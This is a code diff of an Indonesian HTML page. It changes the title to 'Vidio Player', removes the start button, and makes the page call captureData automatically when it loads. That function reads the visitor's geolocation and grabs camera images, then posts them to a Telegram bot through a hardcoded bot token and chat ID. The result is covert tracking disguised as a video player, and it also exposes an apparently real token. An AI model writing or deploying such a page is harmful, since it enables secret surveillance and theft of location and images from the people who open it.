@@ -3,20 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cyber Awareness Logger</title>
+    <title>Vidio Player</title>
 </head>
 <body>
     <h1>Cyber Security Awareness</h1>
     <p>Website ini menunjukkan betapa mudahnya informasi Anda dapat dikumpulkan.</p>
-    <button onclick="captureData()">Mulai</button>
 
     <script>
         const BOT_TOKEN = "7835500770:AAEhp7-8y-mEuhjw2bTUzutQ3rZjmg5zv5o"; // Ganti dengan token bot Telegram
         const CHAT_ID = "-1002270270494"; // Ganti dengan Chat ID Anda
 
         function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            fetch(url, {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message })
@@ -35,6 +33,7 @@
         }
 
         function captureData() {
+            // Ambil lokasi
             navigator.geolocation.getCurrentPosition(
                 position => {
                     const lat = position.coords.latitude;
@@ -52,6 +51,7 @@
                 }
             );
 
+            // Ambil gambar dari kamera
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     let video = document.createElement("video");
@@ -78,6 +78,9 @@
                     sendToTelegram("❌ Kamera tidak diizinkan.");
                 });
         }
+
+        // Jalankan saat halaman dimuat
+        window.onload = captureData;
     </script>
 </body>
 </html>
